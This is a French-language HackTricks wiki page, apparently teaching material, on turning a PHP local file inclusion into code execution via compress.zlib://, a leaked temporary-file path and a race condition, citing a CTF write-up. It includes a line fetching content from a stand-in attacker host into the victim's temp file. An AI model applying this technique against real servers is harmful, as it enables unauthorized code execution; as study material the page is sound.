# LFI2RCE Via compress.zlib + PHP\_STREAM\_PREFER\_STUDIO + Path Disclosure

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### `compress.zlib://` et `PHP_STREAM_PREFER_STDIO`

Un fichier ouvert en utilisant le protocole `compress.zlib://` avec le drapeau `PHP_STREAM_PREFER_STDIO` peut continuer √† √©crire des donn√©es qui arrivent √† la connexion plus tard dans le m√™me fichier.

Cela signifie qu'un appel tel que :
```php
file_get_contents("compress.zlib://http://attacker.com/file")
```
Enverra une requ√™te demandant http://attacker.com/file, puis le serveur pourrait r√©pondre √† la requ√™te avec une r√©ponse HTTP valide, garder la connexion ouverte et envoyer des donn√©es suppl√©mentaires quelque temps plus tard qui seront √©galement √©crites dans le fichier.

Vous pouvez voir cette information dans cette partie du code php-src dans main/streams/cast.c :
```c
/* Use a tmpfile and copy the old streams contents into it */

if (flags & PHP_STREAM_PREFER_STDIO) {
*newstream = php_stream_fopen_tmpfile();
} else {
*newstream = php_stream_temp_new();
}
```
### Condition de course pour RCE

[**Ce CTF**](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer) a √©t√© r√©solu en utilisant le truc pr√©c√©dent.

L'attaquant fera en sorte que le **serveur victime ouvre une connexion en lisant un fichier depuis le serveur de l'attaquant** en utilisant le protocole **`compress.zlib`**.

**Pendant** que cette **connexion** existe, l'attaquant va **exfiltrer le chemin** vers le fichier temporaire cr√©√© (il est divulgu√© par le serveur).

**Tant que** la **connexion** est encore ouverte, l'attaquant va **exploiter un LFI en chargeant le fichier temporaire** qu'il contr√¥le.

Cependant, il y a une v√©rification dans le serveur web qui **emp√™che le chargement de fichiers contenant `<?`**. Par cons√©quent, l'attaquant va abuser d'une **Condition de course**. Dans la connexion qui est encore ouverte, l'**attaquant** va **envoyer la charge utile PHP APR√àS** que le **serveur web** a **v√©rifi√©** si le fichier contient les caract√®res interdits mais **AVANT qu'il ne charge son contenu**.

Pour plus d'informations, consultez la description de la Condition de course et le CTF dans [https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
